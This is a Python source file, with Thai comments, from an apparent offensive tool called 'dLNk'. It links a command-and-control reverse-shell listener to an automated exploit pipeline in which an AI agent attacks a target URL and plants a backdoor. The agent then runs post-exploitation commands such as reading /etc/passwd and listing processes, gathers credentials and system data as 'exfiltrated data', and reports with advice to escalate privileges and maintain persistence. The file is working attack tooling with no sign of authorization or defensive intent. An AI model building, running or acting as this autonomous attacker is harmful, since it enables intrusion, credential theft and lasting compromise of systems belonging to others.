#!/usr/bin/env python3
"""
dLNk C2 Integration
เชื่อมต่อ C2 กับระบบโจมตีหลัก (Attack Manager)
"""

import asyncio
import os
from typing import Dict, Any, Optional
from loguru import logger
from datetime import datetime

from core.shell_handler import ReverseShellHandler
from core.auto_exploit_pipeline import AutoExploitPipeline


class C2Integration:
    """
    เชื่อมต่อ C2 กับระบบโจมตีหลัก
    
    Workflow:
    1. User เริ่มโจมตี → Attack Manager
    2. Attack Manager เปิด C2 Listener อัตโนมัติ
    3. AI Agent โจมตีและสร้าง Backdoor/Reverse Shell
    4. C2 รับการเชื่อมต่อกลับจากเป้าหมาย
    5. AI ควบคุม Shell อัตโนมัติ (Auto Post-Exploitation)
    6. เก็บข้อมูล (Credentials, Files, System Info)
    7. สร้างรายงานส่งให้ User
    """
    
    def __init__(self):
        self.c2_handler = ReverseShellHandler()
        self.auto_exploit = AutoExploitPipeline()
        self.active_attacks: Dict[str, Dict] = {}  # attack_id -> attack_info
        
    async def start_attack_with_c2(self, attack_id: str, target_url: str, attack_type: str, options: Dict = None) -> Dict:
        """
        เริ่มโจมตีพร้อมเปิด C2 Listener อัตโนมัติ
        
        Args:
            attack_id: ID ของการโจมตี
            target_url: URL เป้าหมาย
            attack_type: ประเภทการโจมตี
            options: ตัวเลือกเพิ่มเติม
        
        Returns:
            ผลการโจมตี
        """
        logger.info(f"[C2 Integration] Starting attack {attack_id} on {target_url}")
        
        # 1. เปิด C2 Listener อัตโนมัติ
        if not self.c2_handler.is_running:
            logger.info("[C2 Integration] Starting C2 listener...")
            await self.c2_handler.start_listener()
            logger.success("[C2 Integration] ✅ C2 listener started")
        
        # 2. บันทึกข้อมูลการโจมตี
        self.active_attacks[attack_id] = {
            "target_url": target_url,
            "attack_type": attack_type,
            "started_at": datetime.now().isoformat(),
            "status": "running",
            "c2_sessions": [],
            "exfiltrated_data": {}
        }
        
        # 3. เริ่มโจมตีด้วย Auto Exploit Pipeline
        logger.info(f"[C2 Integration] Launching {attack_type} attack...")
        
        try:
            # Execute attack
            attack_result = await self._execute_attack(attack_id, target_url, attack_type, options or {})
            
            # 4. ถ้าโจมตีสำเร็จ รอรับ reverse shell
            if attack_result.get("success"):
                logger.success(f"[C2 Integration] ✅ Attack successful! Waiting for reverse shell...")
                
                # รอรับ shell connection (timeout 60 seconds)
                shell_session = await self._wait_for_shell(attack_id, timeout=60)
                
                if shell_session:
                    logger.success(f"[C2 Integration] ✅ Reverse shell received from {shell_session.address}")
                    
                    # 5. AI ควบคุม Shell อัตโนมัติ
                    post_exploit_result = await self._auto_post_exploitation(attack_id, shell_session)
                    
                    # 6. เก็บข้อมูล
                    exfiltrated_data = await self._collect_data(attack_id, shell_session)
                    
                    # 7. สร้างรายงาน
                    report = await self._generate_report(attack_id, attack_result, post_exploit_result, exfiltrated_data)
                    
                    return {
                        "success": True,
                        "attack_id": attack_id,
                        "target_url": target_url,
                        "shell_received": True,
                        "shell_session_id": shell_session.session_id,
                        "post_exploitation": post_exploit_result,
                        "exfiltrated_data": exfiltrated_data,
                        "report": report
                    }
                else:
                    logger.warning(f"[C2 Integration] ⚠️ No reverse shell received (timeout)")
                    return {
                        "success": True,
                        "attack_id": attack_id,
                        "target_url": target_url,
                        "shell_received": False,
                        "message": "Attack successful but no reverse shell received"
                    }
            else:
                logger.error(f"[C2 Integration] ❌ Attack failed")
                return {
                    "success": False,
                    "attack_id": attack_id,
                    "target_url": target_url,
                    "error": attack_result.get("error", "Attack failed")
                }
                
        except Exception as e:
            logger.error(f"[C2 Integration] Error: {e}")
            return {
                "success": False,
                "attack_id": attack_id,
                "error": str(e)
            }
    
    async def _execute_attack(self, attack_id: str, target_url: str, attack_type: str, options: Dict) -> Dict:
        """
        Execute attack using Auto Exploit Pipeline
        """
        logger.info(f"[C2 Integration] Executing {attack_type} attack...")
        
        # Use Auto Exploit Pipeline
        result = await self.auto_exploit.execute_attack(
            target_url=target_url,
            attack_type=attack_type,
            options=options
        )
        
        return result
    
    async def _wait_for_shell(self, attack_id: str, timeout: int = 60) -> Optional[Any]:
        """
        รอรับ reverse shell connection
        """
        logger.info(f"[C2 Integration] Waiting for reverse shell (timeout: {timeout}s)...")
        
        start_time = asyncio.get_event_loop().time()
        initial_session_count = len(self.c2_handler.sessions)
        
        while (asyncio.get_event_loop().time() - start_time) < timeout:
            # Check if new session arrived
            current_session_count = len(self.c2_handler.sessions)
            
            if current_session_count > initial_session_count:
                # New session arrived!
                new_sessions = list(self.c2_handler.sessions.values())[-1:]
                if new_sessions:
                    session = new_sessions[0]
                    
                    # Link session to attack
                    self.active_attacks[attack_id]["c2_sessions"].append(session.session_id)
                    
                    return session
            
            await asyncio.sleep(1)
        
        return None
    
    async def _auto_post_exploitation(self, attack_id: str, shell_session: Any) -> Dict:
        """
        AI ควบคุม Shell อัตโนมัติ (Auto Post-Exploitation)
        """
        logger.info(f"[C2 Integration] Starting auto post-exploitation...")
        
        commands = [
            "whoami",
            "hostname",
            "uname -a || systeminfo",
            "pwd || cd",
            "ls -la || dir",
            "cat /etc/passwd || type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "ps aux || tasklist",
            "netstat -an",
            "ifconfig || ipconfig"
        ]
        
        results = {}
        
        for cmd in commands:
            try:
                output = await self.c2_handler.execute_command(shell_session.session_id, cmd)
                results[cmd] = output
                logger.info(f"[C2 Integration] Executed: {cmd}")
            except Exception as e:
                logger.error(f"[C2 Integration] Failed to execute {cmd}: {e}")
                results[cmd] = f"Error: {e}"
        
        return {
            "success": True,
            "commands_executed": len(commands),
            "results": results
        }
    
    async def _collect_data(self, attack_id: str, shell_session: Any) -> Dict:
        """
        เก็บข้อมูลจากเป้าหมาย (Data Exfiltration)
        """
        logger.info(f"[C2 Integration] Collecting data from target...")
        
        data = {
            "credentials": [],
            "files": [],
            "system_info": {},
            "network_info": {}
        }
        
        # Collect system info
        try:
            whoami = await self.c2_handler.execute_command(shell_session.session_id, "whoami")
            hostname = await self.c2_handler.execute_command(shell_session.session_id, "hostname")
            
            data["system_info"] = {
                "user": whoami.strip(),
                "hostname": hostname.strip(),
                "ip": shell_session.address[0]
            }
        except Exception as e:
            logger.error(f"[C2 Integration] Failed to collect system info: {e}")
        
        # Try to collect credentials
        try:
            # Linux
            passwd = await self.c2_handler.execute_command(shell_session.session_id, "cat /etc/passwd 2>/dev/null")
            if passwd and len(passwd) > 10:
                data["credentials"].append({
                    "type": "passwd_file",
                    "content": passwd
                })
        except:
            pass
        
        # Save to attack record
        self.active_attacks[attack_id]["exfiltrated_data"] = data
        
        logger.success(f"[C2 Integration] ✅ Data collection completed")
        
        return data
    
    async def _generate_report(self, attack_id: str, attack_result: Dict, post_exploit_result: Dict, exfiltrated_data: Dict) -> Dict:
        """
        สร้างรายงานส่งให้ User
        """
        logger.info(f"[C2 Integration] Generating attack report...")
        
        attack_info = self.active_attacks.get(attack_id, {})
        
        report = {
            "attack_id": attack_id,
            "target_url": attack_info.get("target_url"),
            "attack_type": attack_info.get("attack_type"),
            "started_at": attack_info.get("started_at"),
            "completed_at": datetime.now().isoformat(),
            "status": "success",
            "summary": {
                "attack_successful": attack_result.get("success", False),
                "shell_received": True,
                "commands_executed": post_exploit_result.get("commands_executed", 0),
                "data_collected": len(exfiltrated_data.get("credentials", [])) + len(exfiltrated_data.get("files", []))
            },
            "attack_details": attack_result,
            "post_exploitation": post_exploit_result,
            "exfiltrated_data": exfiltrated_data,
            "recommendations": [
                "Review collected credentials",
                "Analyze system configuration",
                "Check for privilege escalation opportunities",
                "Maintain persistence if required"
            ]
        }
        
        # Save report
        report_path = f"/home/ubuntu/aiprojectattack/data/reports/attack_{attack_id}.json"
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        
        import json
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.success(f"[C2 Integration] ✅ Report saved: {report_path}")
        
        return report


# Global instance
c2_integration = C2Integration()

